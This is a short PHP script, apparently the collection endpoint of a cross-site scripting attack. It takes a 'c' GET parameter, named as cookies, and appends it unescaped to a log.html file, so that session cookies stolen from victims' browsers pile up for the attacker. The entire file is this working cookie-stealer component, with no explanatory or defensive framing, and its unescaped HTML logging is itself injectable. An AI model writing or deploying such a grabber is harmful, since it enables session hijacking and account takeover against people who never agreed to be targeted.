<?php
$cookies = $_GET["c"];
$file = fopen("log.html", 'a');
fwrite($file, $cookies);
fwrite($file, "\n\n");
?>
